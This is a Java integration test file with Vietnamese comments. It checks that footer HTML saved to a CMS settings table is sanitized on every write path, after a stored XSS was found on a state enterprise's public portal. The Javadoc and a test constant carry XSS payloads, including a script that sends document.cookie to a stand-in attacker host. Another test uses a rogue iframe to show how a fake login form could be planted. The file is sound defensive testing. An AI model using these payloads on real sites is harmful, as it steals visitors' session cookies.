package com.songnhue.app.cms;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.Map;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;

import com.songnhue.app.testsupport.IntegrationTestBase;
import com.songnhue.content.application.SiteConfigService;
import com.songnhue.core.application.settings.SettingService;

/**
 * HTML người dùng soạn phải được khử trùng ở <b>mọi</b> đường ghi vào bảng {@code settings}.
 *
 * <h2>⛔ Lỗ hổng đã đo được, không phải rủi ro lý thuyết</h2>
 *
 * Hai tham số {@code site.footer.company-info} và {@code site.footer.map-embed} là giá trị duy nhất
 * mà cổng công khai dựng bằng {@code dangerouslySetInnerHTML}. Việc khử trùng nằm ở
 * {@code SiteConfigService} — tức là ở <b>một</b> trong <b>ba</b> đường ghi. Đo thật trên hệ đang
 * chạy: gửi
 *
 * <pre>
 *   &lt;img src=x onerror="alert(document.cookie)"&gt;&lt;script&gt;fetch("//kegian.example/"+document.cookie)&lt;/script&gt;
 * </pre>
 *
 * qua {@code PUT /api/v1/settings/&#123;key&#125;} và qua {@code POST /api/v1/settings/import} → cả
 * hai trả 200, CSDL lưu <b>nguyên văn</b>, và {@code GET /api/v1/public/site-config} trả lại
 * <b>nguyên văn</b>. Đây là XSS lưu trữ trên cổng của một doanh nghiệp nhà nước: đoạn mã chạy trong
 * trình duyệt của <i>mọi người dân vào tra cứu</i>.
 *
 * <p>Bản sửa chuyển luật từ <i>nơi gọi</i> sang <i>dữ liệu</i>: cột {@code value_type} nhận thêm
 * {@code HTML} và {@code HTML_EMBED}, và {@code SettingService} khử trùng theo kiểu ở điểm ghi
 * chung. Đường ghi viết sau này cũng bị ràng buộc mà không ai phải nhớ — đúng cách
 * {@code AttachmentService} tự đưa SVG qua {@code SvgSanitizer} thay vì tin nơi gọi.
 */
class SettingHtmlSanitizeTest extends IntegrationTestBase {

    private static final String DOC_HAI =
            "<p>Trụ sở: Hà Đông</p><img src=x onerror=\"alert(1)\">" + "<script>fetch('//kegian.example')</script>";

    @Autowired
    private SettingService settings;

    @Autowired
    private SiteConfigService siteConfig;

    @Autowired
    private JdbcTemplate jdbc;

    @AfterEach
    void tra() {
        jdbc.update(
                "UPDATE settings SET setting_value = NULL WHERE setting_key IN (?, ?)",
                SiteConfigService.KEY_FOOTER_INFO,
                SiteConfigService.KEY_FOOTER_MAP);
    }

    @Test
    @DisplayName("⭐⭐ PUT /settings/{key} — màn hình cấu hình hệ thống — không ghi được mã chạy được")
    void duongCauHinhHeThongKhuTrung() {
        settings.update(SiteConfigService.KEY_FOOTER_INFO, DOC_HAI);
        khangDinhSach(giaTriTrongCsdl(SiteConfigService.KEY_FOOTER_INFO));
    }

    @Test
    @DisplayName("⭐⭐ POST /settings/import — đường nhập hàng loạt — cũng không ghi được")
    void duongNhapCauHinhKhuTrung() {
        settings.importConfiguration(Map.of(SiteConfigService.KEY_FOOTER_INFO, DOC_HAI));
        khangDinhSach(giaTriTrongCsdl(SiteConfigService.KEY_FOOTER_INFO));
    }

    @Test
    @DisplayName("⭐ Đường cấu hình giao diện của CMS vẫn khử trùng sau khi luật dời sang SettingService")
    void duongCmsVanKhuTrung() {
        siteConfig.update(SiteConfigService.KEY_FOOTER_INFO, DOC_HAI);
        khangDinhSach(giaTriTrongCsdl(SiteConfigService.KEY_FOOTER_INFO));
    }

    @Test
    @DisplayName("⭐ Khối bản đồ chỉ nhận iframe theo tên miền, mọi đường ghi")
    void khoiBanDoChiNhanIframeTheoMien() {
        settings.update(SiteConfigService.KEY_FOOTER_MAP, "<iframe src=\"https://ke-gian.example/gia-mao\"></iframe>");
        assertThat(String.valueOf(giaTriTrongCsdl(SiteConfigService.KEY_FOOTER_MAP)))
                .as("iframe trỏ ra ngoài danh sách tên miền phải bị gỡ — nó vẽ được biểu mẫu "
                        + "đăng nhập giả ngay giữa chân trang của cơ quan nhà nước")
                .doesNotContain("ke-gian.example");

        // Vế còn lại. Chỉ kiểm vế cấm thì một hàm xoá sạch mọi iframe cũng xanh trọn vẹn, và khối
        // bản đồ sẽ biến mất khỏi chân trang mà không ai hiểu vì sao.
        settings.update(
                SiteConfigService.KEY_FOOTER_MAP,
                "<iframe src=\"https://www.google.com/maps/embed?pb=abc\" width=\"600\"></iframe>");
        assertThat(giaTriTrongCsdl(SiteConfigService.KEY_FOOTER_MAP))
                .as("bản đồ Google hợp lệ phải đi qua được")
                .contains("www.google.com/maps/embed");
    }

    @Test
    @DisplayName("⛔ Hai dòng settings phải giữ đúng value_type — đổi về TEXT là bộ lọc lặng lẽ tắt")
    void giuDungKieuGiaTri() {
        assertThat(kieuCua(SiteConfigService.KEY_FOOTER_INFO)).isEqualTo("HTML");
        assertThat(kieuCua(SiteConfigService.KEY_FOOTER_MAP)).isEqualTo("HTML_EMBED");
    }

    @Test
    @DisplayName("⭐ Nhập cấu hình cũng đánh thức đệm của cổng — trước đây chỉ update() làm việc đó")
    void nhapCauHinhDanhThucDemCuaCong() {
        settings.update(SiteConfigService.KEY_FOOTER_INFO, "<p>Giá trị cũ</p>");
        assertThat(siteConfig.effectiveValues().get(SiteConfigService.KEY_FOOTER_INFO))
                .contains("Giá trị cũ");

        settings.importConfiguration(Map.of(SiteConfigService.KEY_FOOTER_INFO, "<p>Giá trị mới</p>"));

        assertThat(siteConfig.effectiveValues().get(SiteConfigService.KEY_FOOTER_INFO))
                .as("đệm của SiteConfigService sống 10 phút; không phát SettingChangedEvent thì "
                        + "quản trị viên nhập cấu hình xong, giao diện báo thành công, mà cổng vẫn "
                        + "hiện nội dung cũ suốt 10 phút — không lỗi nào")
                .contains("Giá trị mới");
    }

    // -------------------------------------------------------------------------

    private static void khangDinhSach(String giaTri) {
        // Khẳng định cả hai vế. Chỉ kiểm "không còn <script>" thì một hàm trả chuỗi rỗng cũng xanh,
        // mà mất trắng khối chân trang là một kiểu hỏng khác chứ không phải an toàn.
        assertThat(giaTri)
                .as("phải gỡ hết mã chạy được")
                .doesNotContain("<script")
                .doesNotContain("onerror");
        assertThat(giaTri).as("phải giữ lại phần nội dung hợp lệ").contains("Trụ sở");
    }

    private String giaTriTrongCsdl(String key) {
        return jdbc.queryForObject("SELECT setting_value FROM settings WHERE setting_key = ?", String.class, key);
    }

    private String kieuCua(String key) {
        return jdbc.queryForObject("SELECT value_type FROM settings WHERE setting_key = ?", String.class, key);
    }
}
